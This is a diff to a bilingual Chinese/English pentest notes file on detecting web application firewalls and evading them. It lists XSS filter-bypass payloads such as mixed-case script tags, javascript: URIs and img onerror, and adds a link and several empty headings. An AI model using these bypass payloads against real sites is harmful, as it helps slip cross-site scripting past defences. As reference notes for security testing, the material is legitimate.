@@ -1,5 +1,5 @@
 # Web Application Firewall (WAF)
-
+https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2 <br>
 ## 手動識別 WAF
 - WAF 的名稱Server 標題（例如Server: cloudflare）
 - 與 WAF 相關的其他 HTTP 回應標頭（例如CF-RAY: xxxxxxxxxxx）
@@ -16,7 +16,8 @@
   - $ wafw00f example.com
 3. WhatWaf
 
-## 繞過WAF
+# Bypassing WAFs
+## Bypassing Regex
 - 更改有效載荷的大小寫 :
     - <sCrIpT>alert(XSS)</sCriPt> 
 - 使用各種編碼、替換函數或字元 :
@@ -27,6 +28,14 @@
     - 雙開尖括號 : java%0ascript:alert ( http.com 
     - 不常見的標籤 : <"STYLE>.classname{background-image:url( "javascript:alert(XSS)" );/STYLE">
     - 需要繞過: <"img/src=1/onerror=alert(0)">
-    - 額外字符 : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa href=javascript:alert(1)>xss</a>
+    - 額外字符 : aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa href=javascript:alert(1)>xss</a">"
 
+## Obfuscation 混淆 
 
+## Charset 字元集
+
+## Content Size 內容大小
+
+## Unicode Compatibility
+
+## Uninitialized Variables 未初始化
